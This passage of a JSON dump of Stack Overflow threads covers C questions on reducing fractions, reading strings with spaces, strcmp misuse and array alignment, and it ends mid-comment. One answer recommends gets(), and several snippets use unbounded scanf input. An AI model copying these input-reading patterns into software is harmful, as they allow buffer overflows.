44668774, "comment_id": 76322251, "body": "Nope. In C, <code>2&#47;4</code> gives <code>0</code> not <code>0.5</code>. As for the problem, how would you simplify the fraction on paper? You&#39;ll need to find a common divisor and then divide the numerator and denominator with it until no such divisor exists (except 1)"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1498028099, "post_id": 44668774, "comment_id": 76322269, "body": "google <code>integer division</code>."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 1, "creation_date": 1498028102, "post_id": 44668774, "comment_id": 76322270, "body": "Find HCF, divide both numbers and print in that format."}, {"owner": {"reputation": 4756, "user_id": 1364149, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/Y25ip.jpg?s=128&g=1", "display_name": "Shloim", "link": "https://stackoverflow.com/users/1364149/shloim"}, "edited": false, "score": 1, "creation_date": 1498028168, "post_id": 44668774, "comment_id": 76322300, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/4819075/how-to-output-fraction-instead-of-decimal-number\">How to output fraction instead of decimal number?</a>"}, {"owner": {"reputation": 36, "user_id": 8121089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6oQoj.jpg?s=128&g=1", "display_name": "Uchiha Lucky CS", "link": "https://stackoverflow.com/users/8121089/uchiha-lucky-cs"}, "edited": false, "score": 0, "creation_date": 1498028247, "post_id": 44668774, "comment_id": 76322355, "body": "It was in c++ but I want in c #Shloim"}, {"owner": {"reputation": 16785, "user_id": 3355476, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/YdMWy.jpg?s=128&g=1", "display_name": "Codor", "link": "https://stackoverflow.com/users/3355476/codor"}, "edited": false, "score": 1, "creation_date": 1498028252, "post_id": 44668774, "comment_id": 76322356, "body": "The question is a bit broad; perhaps you need an implementation of rational numbers."}, {"owner": {"reputation": 4756, "user_id": 1364149, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/Y25ip.jpg?s=128&g=1", "display_name": "Shloim", "link": "https://stackoverflow.com/users/1364149/shloim"}, "edited": false, "score": 0, "creation_date": 1498028708, "post_id": 44668774, "comment_id": 76322615, "body": "Since there&#39;s no native solution in C++, there is non in C. You can port the C++ solution given in the link to C."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1498031946, "post_id": 44668774, "comment_id": 76324688, "body": "There&#39;s no standard library support for rational numbers (ratio of two integers) in C.  What you can do is write code that uses a structure type to provide such support.  You need to know about the oldest of all algorithms \u2014 the greatest common divisor or GCD, which dates back to Ancient Greece. You may decide you need an arbitrary precision integer library to support that,  or you might find that there&#39;s a library that already does the job.  GMP is a well-known multi-precision library."}], "answers": [{"tags": [], "owner": {"reputation": 9, "user_id": 4914720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/183c9fc50a13b97389d2c59fbc443b50?s=128&d=identicon&r=PG&f=1", "display_name": "Kazhian", "link": "https://stackoverflow.com/users/4914720/kazhian"}, "is_accepted": false, "score": 0, "last_activity_date": 1498028406, "creation_date": 1498028406, "answer_id": 44668901, "question_id": 44668774, "link": "https://stackoverflow.com/questions/44668774/reduce-fractions-in-c/44668901#44668901", "title": "Reduce fractions in C", "body": "<p>C does not have that ability built in. However, what you can do is, write a small function that takes fraction values (0.5 in your case) and returns the fraction the form your are looking for (ie, 1/2).</p>\n\n<p><strong>But remember</strong>, 1/2 is not a numeric; it is a string (char array). So, you can use it for display/print purpose only; you can not use in arithmetic expressions.</p>\n"}, {"tags": [], "owner": {"reputation": 42880, "user_id": 982161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/kutcC.png?s=128&g=1", "display_name": "\u03a6Xoc\u0119 \uc6c3 \u041fepe&#250;pa \u30c4", "link": "https://stackoverflow.com/users/982161/%ce%a6xoc%c4%99-%ec%9b%83-%d0%9fepe%c3%bapa-%e3%83%84"}, "is_accepted": false, "score": 0, "last_activity_date": 1498032818, "creation_date": 1498032818, "answer_id": 44670411, "question_id": 44668774, "link": "https://stackoverflow.com/questions/44668774/reduce-fractions-in-c/44670411#44670411", "title": "Reduce fractions in C", "body": "<p>sorry that I can not adapt this to C, but you can for sure port back the code since is not soo complex</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n\nlong GreatestCommonMultiple(long&amp; a, long&amp; b);\nstd::string SimplifyThis(long&amp; a, long&amp; b);\n\nint main(int argC, char** argV)\n{\n    long n1 = 3;\n    long n2 = 21;\n    std::cout &lt;&lt; \"This as simplified fraction: \" &lt;&lt; n1 &lt;&lt; \"/\" &lt;&lt; n2 &lt;&lt; \" is \"&lt;&lt;SimplifyThis(n1, n2)&lt;&lt;std::endl;\n    return 0;\n}\n\nstd::string SimplifyThis(long&amp; a, long&amp; b) {\n    long gcm1 = GreatestCommonMultiple(a, b);\n    return std::to_string(a / gcm1) + \"/\" + std::to_string(b / gcm1);\n}\n\nlong GreatestCommonMultiple(long&amp; a, long&amp; b) {\n    if (b==0)\n    {\n        return a;\n    }\n    long x = (a % b);\n    return GreatestCommonMultiple(b, x);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4028, "user_id": 1721136, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/9b4f8ad672610e3b4d2b2b47f52cb527?s=128&d=identicon&r=PG", "display_name": "Bill Tarbell", "link": "https://stackoverflow.com/users/1721136/bill-tarbell"}, "is_accepted": true, "score": 2, "last_activity_date": 1498034068, "creation_date": 1498034068, "answer_id": 44670823, "question_id": 44668774, "link": "https://stackoverflow.com/questions/44668774/reduce-fractions-in-c/44670823#44670823", "title": "Reduce fractions in C", "body": "<p>What you really want is to <em>reduce the fraction</em>.. not compute the division.</p>\n\n<p>Here's a quick sample that will yield the reduced fraction:</p>\n\n<pre><code>#include &lt;stdbool.h&gt;\n#include &lt;stdio.h&gt;\n\n//gcf function - return gcd of two numbers\nint gcd(int n, int m)\n{\n    int gcd, remainder;\n\n    while (n != 0)\n    {\n        remainder = m % n;\n        m = n;\n        n = remainder;\n    }\n\n    gcd = m;\n\n    return gcd;\n}//end gcd function\n\nint main (int argc, const char * argv[]) {\n    // insert code here...\n    //--declarations\n    int number1, number2;\n    int newNumber1, newNumber2;\n\n    //--get user input\n    printf(\"Enter a fraction: \");\n    scanf(\"%d/%d\", &amp;number1, &amp;number2);\n\n    //--calculations\n    //find the gcd of numerator and denominator\n    //then divide both the numerator and denominator by the GCD\n    newNumber1 = number1 / gcd(number1, number2);\n    newNumber2 = number2 / gcd(number1, number2);\n\n    //--results\n    printf(\"In lowest terms: %d/%d\", newNumber1, newNumber2);\n}\n</code></pre>\n\n<p>Sample taken from: <a href=\"http://snipplr.com/view/42917/\" rel=\"nofollow noreferrer\">http://snipplr.com/view/42917/</a></p>\n"}], "owner": {"reputation": 36, "user_id": 8121089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6oQoj.jpg?s=128&g=1", "display_name": "Uchiha Lucky CS", "link": "https://stackoverflow.com/users/8121089/uchiha-lucky-cs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4976, "favorite_count": 0, "accepted_answer_id": 44670823, "answer_count": 3, "score": -3, "last_activity_date": 1498042219, "creation_date": 1498028011, "last_edit_date": 1498042219, "question_id": 44668774, "link": "https://stackoverflow.com/questions/44668774/reduce-fractions-in-c", "title": "Reduce fractions in C", "body": "<p>In c programming when I divide 2 numbers like 2/4 it gives output 0.5 but I want 1/2. So I want know how to perform division to get answer in fractions like numerator/denominator. I want in C.</p>\n"}, {"tags": ["c", "arrays", "character", "space"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1498027312, "post_id": 44668520, "comment_id": 76321813, "body": "The <a href=\"http://en.cppreference.com/w/c/io/fscanf\" rel=\"nofollow noreferrer\"><code>scanf</code></a> function with the <code>&quot;%s&quot;</code> format stops reading on whitespace. Perhaps you want <a href=\"http://en.cppreference.com/w/c/io/fgets\" rel=\"nofollow noreferrer\"><code>fgets</code></a>?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1498027390, "post_id": 44668520, "comment_id": 76321870, "body": "Also please don&#39;t use the full size of the array as the length of the string, as the contents beyond the string terminator will not be initialized and will have <i>indeterminate</i> contents."}, {"owner": {"reputation": 30168, "user_id": 5612562, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/gzBQY.jpg?s=128&g=1", "display_name": "msc", "link": "https://stackoverflow.com/users/5612562/msc"}, "edited": false, "score": 0, "creation_date": 1498027535, "post_id": 44668520, "comment_id": 76321953, "body": "You can use <code>scanf(&quot;%[^\\n]s&quot;,ss);</code> instead of <code>scanf(&quot;%s&quot;,&amp;ss);</code>"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1498027561, "post_id": 44668520, "comment_id": 76321969, "body": "<code>size=sizeof(ss)&#47;sizeof(ss[0]);</code> -&gt; <code>strlen(ss);</code>"}, {"owner": {"reputation": 1613, "user_id": 5013336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d627dbf935d8dcb71c8eff8a223e97cc?s=128&d=identicon&r=PG", "display_name": "Arka Mukherjee", "link": "https://stackoverflow.com/users/5013336/arka-mukherjee"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1498027594, "post_id": 44668520, "comment_id": 76321985, "body": "@Someprogrammerdude Thanks a bunch. That fixed the issue!"}], "answers": [{"tags": [], "owner": {"reputation": 328, "user_id": 8010390, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/46c400c051659a29e3a5497877b9e5d3?s=128&d=identicon&r=PG&f=1", "display_name": "surjit", "link": "https://stackoverflow.com/users/8010390/surjit"}, "is_accepted": false, "score": 0, "last_activity_date": 1498030361, "creation_date": 1498030361, "answer_id": 44669558, "question_id": 44668520, "link": "https://stackoverflow.com/questions/44668520/display-the-first-letter-of-every-word-in-a-string-having-spaces/44669558#44669558", "title": "display the first letter of every word in a string having spaces", "body": "<p>Change <code>sacnf(\"%s\", &amp;ss)</code> to <code>sacnf(\"%[^\\n]\", &amp;ss)</code></p>\n\n<p>In <code>scanf</code> <code>%s</code> scans a string upto a space or a new line character.<br>\nIn <code>sacnf(\"%[^\\n]\", &amp;ss)</code> you are telling scanf to scan upto <code>\\n</code>, now scanf will scan everything you give as input upto the <code>\\n</code> character.<br>\nIn other places you can can use this technique to scan input upto a specific character. Just replace the <code>\\n</code> character with desired character.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 8192746, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd166c2fd3bdd22bfad9cc9931fac9e0?s=128&d=identicon&r=PG&f=1", "display_name": "Andrej Trozic", "link": "https://stackoverflow.com/users/8192746/andrej-trozic"}, "is_accepted": false, "score": 0, "last_activity_date": 1498048171, "last_edit_date": 1498048171, "creation_date": 1498031200, "answer_id": 44669873, "question_id": 44668520, "link": "https://stackoverflow.com/questions/44668520/display-the-first-letter-of-every-word-in-a-string-having-spaces/44669873#44669873", "title": "display the first letter of every word in a string having spaces", "body": "<p>You can use the C library function ' isspace() '. To use this function you need to open ctype library <code>#include &lt;ctype.h&gt;</code>. If the character is a white space (tab, vtab, new line) the function will return 1 otherwise, it returns the value is 0.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 8192746, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd166c2fd3bdd22bfad9cc9931fac9e0?s=128&d=identicon&r=PG&f=1", "display_name": "Andrej Trozic", "link": "https://stackoverflow.com/users/8192746/andrej-trozic"}, "is_accepted": false, "score": 0, "last_activity_date": 1498049915, "creation_date": 1498049915, "answer_id": 44676858, "question_id": 44668520, "link": "https://stackoverflow.com/questions/44668520/display-the-first-letter-of-every-word-in-a-string-having-spaces/44676858#44676858", "title": "display the first letter of every word in a string having spaces", "body": "<p>Also in cases like this one, you can use gets(); function.\nThe code for right string input is:</p>\n\n<pre><code>char txt[101] = {0}, *ptr;\n\n printf(\"Message: \\n\"); // note \\n\n gets(txt);\n\n ptr = (char*)calloc( strlen(txt)+1, sizeof(char)); \n// note + 1 we need byte space for '\\0' character \n\nstrcpy(ptr, txt);\n</code></pre>\n"}], "owner": {"reputation": 1613, "user_id": 5013336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d627dbf935d8dcb71c8eff8a223e97cc?s=128&d=identicon&r=PG", "display_name": "Arka Mukherjee", "link": "https://stackoverflow.com/users/5013336/arka-mukherjee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1134, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1498049915, "creation_date": 1498027169, "last_edit_date": 1498027461, "question_id": 44668520, "link": "https://stackoverflow.com/questions/44668520/display-the-first-letter-of-every-word-in-a-string-having-spaces", "title": "display the first letter of every word in a string having spaces", "body": "<p>I am trying to display the first letter of every word in this C program. However, it is not recognizing the spaces in my given input. I'm printing a line inside the if statement as a debugging measure. However, that line is not being executed. It is only outputting the first element of the input. Thanks in advance! </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;string.h&gt;\n\nvoid stringg(char s[],int size)\n{\n        int i=1;\n        char r[size];\n        r[0]=s[0];\n        int j;\n        for(j=0;j&lt;size;j++)\n        {\n\n                if(s[j]==' ')\n                {\n                        printf(\"Space Test \\n\");\n                        r[i]=s[j+1];\n                        i++;\n                }\n        }\n        r[i]='\\0';\n        printf(\"\\n The Returned String is %s\",&amp;r);\n        return;\n}\nint main()\n{\n        char ss[100];\n        scanf(\"%s\",&amp;ss);\n        int size;\n        size=sizeof(ss)/sizeof(ss[0]);\n        stringg(ss,size);\n        return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "string", "strcpy"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1498026273, "post_id": 44668248, "comment_id": 76321286, "body": "<a href=\"https://stackoverflow.com/q/605845/2173917\">Please see this discussion on why not to cast the return value of malloc() and family in C..</a>"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 4, "creation_date": 1498026290, "post_id": 44668248, "comment_id": 76321292, "body": "Wait...what is <code>n</code>?"}, {"owner": {"reputation": 175, "user_id": 3762146, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/b7d70a8f28ea8bd6420c252a16692ac4?s=128&d=identicon&r=PG&f=1", "display_name": "user3762146", "link": "https://stackoverflow.com/users/3762146/user3762146"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1498026545, "post_id": 44668248, "comment_id": 76321413, "body": "sorry... n is the length of the array. Updated here."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1498027348, "post_id": 44668248, "comment_id": 76321841, "body": "&quot;why not to cast&quot; - and keep an eye, too, on <a href=\"https://stackoverflow.com/a/14879184/1312382\">this</a> answer. Truth is, that there are two opposing fractions, one in favour and one against casting. So decide yourself what is more natural for you..."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1498027664, "post_id": 44668248, "comment_id": 76322021, "body": "What is the program supposed to do?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1498028626, "post_id": 44668248, "comment_id": 76322574, "body": "@Aconcagua &quot;the other fraction&quot; is typically C++ programmers, who also prefer to write <code>int* a</code> instead of <code>int *a</code>. There&#39;s nothing wrong with making intention explicit of course, but in case of <code>void *</code>, an assignment is explicit enough for a <i>C</i> programmer."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 1, "creation_date": 1498029203, "post_id": 44668248, "comment_id": 76322918, "body": "@Aconcagua adding to my comment, it&#39;s a good thing to present counter-arguments to something not universally agreed on. I just think it has to do with a <i>C mindset</i> vs. <i>C++ mindset</i>. To support this, consider that casting of pointers is common in C++ (because of inheritance), but often a sign for undefined behavior in C (you should use unions of structs with a common initial sequence here). A good C program often doesn&#39;t have a single cast between pointer types."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1498030082, "post_id": 44668248, "comment_id": 76323472, "body": "@FelixPalmen C++ offers more fine grained casting via static_cast, dynamic_cast, const_cast, reinterpret_cast, which should be preferred over the classic C style cast. A reinterpret_cast would correspond to the cast in C in context of UB you mention. However, there are quite a lot of counter examples in pure C, such as socket programming (<code>(sockaddr*)&amp;sockaddr_in</code>). Another counter example: a header-only library (probably not that a good idea if one needs malloc there...), still, it would get unusable from C++ if <code>malloc</code>ing without cast (sure, some other stuff such as VLA to be avoided, too)."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 1, "creation_date": 1498030443, "post_id": 44668248, "comment_id": 76323725, "body": "@Aconcagua I&#39;m quite aware of the C++ cast operators, I think they somewhat support my argument above? The classical socket API is btw a mess and actually an example for bad C code."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1498031380, "post_id": 44668248, "comment_id": 76324321, "body": "Not sure - &quot;A good C program often doesn&#39;t have a single cast&quot; is not true - an implilcit cast is still a cast... Same argument would then be applicable to skipping any unnecessary parentheses (<code>if((x = get()))</code> or <code>if((a &amp;&amp; b) || (c &amp;&amp; d))</code>) where many compiler warn about if not set explicitly..."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1498031790, "post_id": 44668248, "comment_id": 76324585, "body": "But now we are at a discussion which here is not the right place for - and I actually did not want to start. My original intention was just to oppose trying to push people into one or another direction (&quot;you should not&quot;) - there are two oppinions and everybody should be free to make up his/her own mind, just as I would have opposed to if anyone would have tried to force others into k&amp;r style (yeah, I consider allman superior...)."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1498031810, "post_id": 44668248, "comment_id": 76324601, "body": "@Aconcagua: An &quot;implicit cast&quot; is actually called an &quot;implicit conversion&quot;, so by the wording of the standard, it isn&#39;t a cast. The conversion between pointer types is <i>only</i> implicit to and from <code>void *</code>, so anything else is a code smell (note my wording included &quot;between pointer types&quot;)."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1498032882, "post_id": 44668248, "comment_id": 76325235, "body": "@FelixPalmen I don&#39;t see much difference in the <i>argument</i> if I (correctly) reword into implicit conversion vs. explicit conversion (<i>via</i> cast)... I finally stay with: If people prefer to cast, just <i>let</i> them - <i>and</i> the other way round, if people prefer <i>not</i> to, just let them as well..."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1498048313, "post_id": 44668248, "comment_id": 76336379, "body": "In addition to the linked duplicate, also see <a href=\"https://stackoverflow.com/questions/3131319/how-to-correctly-assign-a-new-string-value\">How to correctly assign a new string value?</a>. These are found in the <a href=\"https://stackoverflow.com/tags/c/info\">SO C FAQ</a>."}], "answers": [{"comments": [{"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1498028415, "post_id": 44668711, "comment_id": 76322454, "body": "You mean <code>== 0</code>..."}, {"owner": {"reputation": 9795, "user_id": 1566187, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/00cb2ecc49f0f05736dc7c14bbccfeaa?s=128&d=identicon&r=PG", "display_name": "Ely", "link": "https://stackoverflow.com/users/1566187/ely"}, "reply_to_user": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1498028601, "post_id": 44668711, "comment_id": 76322558, "body": "Yes, indeed. Thanks for correcting my brain twist."}, {"owner": {"reputation": 175, "user_id": 3762146, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/b7d70a8f28ea8bd6420c252a16692ac4?s=128&d=identicon&r=PG&f=1", "display_name": "user3762146", "link": "https://stackoverflow.com/users/3762146/user3762146"}, "edited": false, "score": 0, "creation_date": 1498040513, "post_id": 44668711, "comment_id": 76330723, "body": "oh god.. That was so silly.. Thanks"}], "tags": [], "owner": {"reputation": 9795, "user_id": 1566187, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/00cb2ecc49f0f05736dc7c14bbccfeaa?s=128&d=identicon&r=PG", "display_name": "Ely", "link": "https://stackoverflow.com/users/1566187/ely"}, "is_accepted": true, "score": 3, "last_activity_date": 1498028578, "last_edit_date": 1498028578, "creation_date": 1498027792, "answer_id": 44668711, "question_id": 44668248, "link": "https://stackoverflow.com/questions/44668248/getting-unexpected-results-for-array-of-strings-when-using-operator/44668711#44668711", "title": "Getting unexpected results for array of strings when using = operator", "body": "<pre><code>if (strcmp(final[end], \"\"))\n</code></pre>\n\n<p><code>strcmp</code> returns <code>0</code> if <code>final[end]</code> compares equally to the empty string.<br>\nA <code>0</code> in the <code>if</code> condition means <code>false</code>, so the if-block is not executed. I believe you want it executed. So you should do</p>\n\n<pre><code>if (strcmp(final[end], \"\") == 0)\n</code></pre>\n\n<p>The same applies to the <code>else if</code> statement.</p>\n"}], "owner": {"reputation": 175, "user_id": 3762146, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/b7d70a8f28ea8bd6420c252a16692ac4?s=128&d=identicon&r=PG&f=1", "display_name": "user3762146", "link": "https://stackoverflow.com/users/3762146/user3762146"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "closed_date": 1498048194, "accepted_answer_id": 44668711, "answer_count": 1, "score": 1, "last_activity_date": 1498028578, "creation_date": 1498026173, "last_edit_date": 1498027125, "question_id": 44668248, "link": "https://stackoverflow.com/questions/44668248/getting-unexpected-results-for-array-of-strings-when-using-operator", "closed_reason": "Duplicate", "title": "Getting unexpected results for array of strings when using = operator", "body": "<p>In the below code I am getting unexpected result. During first iteration s[0] is getting printed as the first element. But during the remaining iteration,  0 is getting printed. Is it wrong to use = operator instead of strcpy? I tried using strcpy but it results in segmentation fault. Why is wrong value getting printed?</p>\n\n<pre><code>int main() {\n    int n, i;\n    scanf(\"%d\", &amp;n);\n    int c, j;\n    char* s[n];\n    char* ch = (char*)malloc(100);\n    for (i = 0; i &lt; n; i++) {\n        scanf(\"%s\", ch);\n        s[i] = strdup(ch);\n    }\n\n    char* final[n];\n    int count[n];\n    for (i = 0; i &lt; n; i++) {\n        final[i] = \"\";\n        count[i] = 0;\n    }\n    int end;\n    for (i = 0; i &lt; n; i++) {\n        end = 0;\n        while (1) {\n            printf(\"%s\\n\", s[0]);\n            if (strcmp(final[end], \"\")) {\n                count[end]++;\n                final[end] = s[i];\n                // printf(\"%s\\n\",final[end]);\n                end++;\n                break;\n            }\n            else if (strcmp(final[end], s[i])) {\n                final[end] = s[i];\n                sprintf(final[end], \"%d\", count[end]);\n                count[end]++;\n                end++;\n                break;\n            }\n            end++;\n        }\n    }\n    for (i = 0; i &lt; n; i++) {\n        // printf(\"%s\\n\",final[i]);\n    }\n    return 1;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1498026118, "post_id": 44668213, "comment_id": 76321224, "body": "Nitpick: You must cast the arguments to <code>void *</code>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 2, "creation_date": 1498026589, "post_id": 44668213, "comment_id": 76321433, "body": "Arrays are <i>always</i> stored contiguously. You can only influence the alignment of the array&#39;s start address with this attribute. Eg <code>Array</code> will <i>start</i> at an address divisable by 32."}, {"owner": {"reputation": 3818, "user_id": 4451521, "user_type": "registered", "accept_rate": 34, "profile_image": "https://www.gravatar.com/avatar/4b19b54142d820aad565ca95f920c11c?s=128&d=identicon&r=PG", "display_name": "KansaiRobot", "link": "https://stackoverflow.com/users/4451521/kansairobot"}, "edited": false, "score": 0, "creation_date": 1498026708, "post_id": 44668213, "comment_id": 76321485, "body": "I see. Why would that be important? And how can I see that in the example results I posted above?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498026903, "post_id": 44668213, "comment_id": 76321579, "body": "Try to divide the first address printed by 32. For why this <i>could</i> be important: e.g. interfacing with DMA hardware requiring that, or some performance consideration -- this is a quite broad question."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498026975, "post_id": 44668213, "comment_id": 76321614, "body": "It&#39;s an extension anyways and writing <i>application</i> code, you&#39;ll 